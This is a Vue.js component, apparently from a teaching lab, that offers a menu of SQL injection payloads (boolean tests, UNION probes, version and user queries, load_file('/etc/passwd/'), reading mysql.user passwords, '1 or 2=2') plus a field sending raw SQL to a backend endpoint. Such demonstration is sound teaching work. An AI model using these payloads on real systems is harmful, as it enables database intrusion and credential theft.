<template>
  <div style="height: 900px;">
    <div style="height: 30px;">
      <Progress :percent="progress" :stroke-color="['#108ee9', '#87d068']" :stroke-width="20" status="active" hide-info/>
    </div>
    <h2>前端</h2>
    <Form ref="userId" :model="messageInfo" label-position="left" :label-width="200">
      <FormItem label="User ID:">
          <AutoComplete
            v-model="idWithSqlInjection"
            icon="ios-search"
            placeholder="input here"
            style="width:300px">
            <div class="demo-auto-complete-item" v-for="item in sqlInjection" :key="item">
              <div class="demo-auto-complete-group">
                <span>{{ item.title }}</span>
              </div>
              <Option v-for="option in item.children" :value="option.title" :key="option.title">
                <span class="demo-auto-complete-title">{{ option.title }}</span>
                <span v-if="option.count != undefined" class="demo-auto-complete-count"> Memo: {{ option.count }}</span>
              </Option>
            </div>
          </AutoComplete>
      </FormItem>
      <FormItem>
        <i-button type="success" @click = "handleQuery">Submit</i-button>
        <i-button type="error" @click = "handleReset('userId')">RESET</i-button>
      </FormItem>
      <FormItem label="SQL to execute:">
        <AutoComplete
          v-model="messageInfo.sql"
          icon="ios-search"
          placeholder="input here"
          style="width:300px">
          <div class="demo-auto-complete-item" v-for="item in sqlExecute" :key="item">
            <div class="demo-auto-complete-group">
              <span>{{ item.title }}</span>
            </div>
            <Option v-for="option in item.children" :value="option.title" :key="option.title">
              <span class="demo-auto-complete-title">{{ option.title }}</span>
            </Option>
          </div>
        </AutoComplete>
      </FormItem>
      <FormItem>
        <i-button type="success" @click = "handleSubmit(messageInfo)">Submit</i-button>
        <i-button type="error" @click = "handleReset('messageInfo')">RESET</i-button>
      </FormItem>
    </Form>
    <Divider> </Divider>
    <h2>后端</h2>
    <Tag color="primary" v-if = "feedbackMessage === ''">Haven't Submit</Tag>
    <Tag color="success" v-else-if = "status === 1">Success</Tag>
    <Tag color="error" v-else>Error</Tag>
    <Form ref="feedbackMessage" :model="feedbackMessage" label-position="left" :label-width="100" inline>
      <FormItem label="执行结果">
        <Spin size="large" v-if="loading"></Spin>
        <Input v-else v-model="feedbackMessage" type="textarea" :autosize="{minRows: 2,maxRows: 8}" placeholder="Haven't submit..." style="width: 500px" />
      </FormItem>
    </Form>
  </div>
</template>
<script>
export default {
  name: 'SQLInjection',
  data () {
    return {
      messageInfo: {
        sql: '',
        category: ''
      },
      idWithSqlInjection: '',
      value4: '',
      sqlInjection: [
        {
          title: '正常查询',
          children: [
            {
              title: '1'
            },
            {
              title: '2'
            }
          ]
        },
        {
          title: '注入判断',
          children: [
            {
              title: '1',
              count: '正常结果'
            },
            {
              title: '1 and 1=1',
              count: '若存在注入点，则与第一条结果一致'
            },
            {
              title: '1 and 1= 2',
              count: '且该条结果与第一条结果不同'
            }
          ]
        },
        {
          title: '构造union',
          children: [
            {
              title: '1 union select 1'
            },
            {
              title: '1 union select 1, 2'
            },
            {
              title: '1 union select 1, 2, 3'
            },
            {
              title: '1 union select * from user'
            }
          ]
        },
        {
          title: '查询数据库信息',
          children: [
            {
              title: '1 union select version()',
              count: '调用mysql函数，返回版本'
            },
            {
              title: '1 union select database()',
              count: '调用mysql函数，返回数据库名字'
            }
          ]
        },
        {
          title: '查询数据库用户',
          children: [
            {
              title: '1 union select user()'
            },
            {
              title: '1 union select session_user()'
            },
            {
              title: '1 union select system_user()'
            }
          ]
        },
        {
          title: '读取系统信息',
          children: [
            {
              title: '1 union select load_file(\'/etc/passwd/\')',
              count: '读取文件，返回系统密码'
            },
            {
              title: '1 select user.password from mysql.user',
              count: '返回数据库用户的密码'
            }
          ]
        },
        {
          title: '返回所有数据',
          children: [
            {
              title: '1 or 2=2'
            }
          ]
        }
      ],
      sqlExecute: [
        {
          title: '显示数据库中的table',
          children: [
            {
              title: 'show databases;'
            }
          ]
        }
      ],
      status: '',
      feedbackMessage: '',
      result: '',
      progress: 0,
      loading: false
    }
  },
  created () {
  },
  methods: {
    postData () {
      console.log(this.$qs.stringify({ sql: this.messageInfo.sql }))
      this.$api.post('/seminar3/exp1', this.$qs.stringify({ sql: this.messageInfo.sql }), r => {
        r = r.data
        if (r.success === true) {
          this.feedbackMessage = r.data
          this.status = r.success
          console.log(this.feedbackMessage)
          this.$Message.success('Success!')
        } else {
          this.$Message.error('Fail! ' + r.errorMsg)
        }
      })
    },
    handleSubmit (name) { // 带''是字符串, 不带传入Object
      console.log(name)
      this.postData()
    },
    handleReset (name) {
      this.$refs[name].resetFields()
      this.messageInfo = []
      this.status = ''
      this.feedbackMessage = ''
      this.idWithSqlInjection = ''
    },
    handleQuery () { // 带''是字符串, 不带传入Object
      this.$api.get('/seminar3/exp1', { id: this.idWithSqlInjection }, r => {
        r = r.data
        if (r.success === true) {
          this.feedbackMessage = JSON.stringify(r.data)
          this.status = r.success
          console.log(this.feedbackMessage)
          this.$Message.success('Success!')
        } else {
          this.$Message.error('Fail! ' + r.errorMsg)
        }
      })
    }
  }
}
</script>
<style>
  .demo-auto-complete-item{
    padding: 4px 0;
    border-bottom: 1px solid #F6F6F6;
  }
  .demo-auto-complete-group{
    font-size: 12px;
    padding: 4px 6px;
  }
  .demo-auto-complete-group span{
    color: #666;
    font-weight: bold;
  }
  .demo-auto-complete-group a{
    float: right;
  }
  .demo-auto-complete-count{
    float: right;
    color: #999;
  }
  .demo-auto-complete-more{
    display: block;
    margin: 0 auto;
    padding: 4px;
    text-align: center;
    font-size: 12px;
  }
</style>
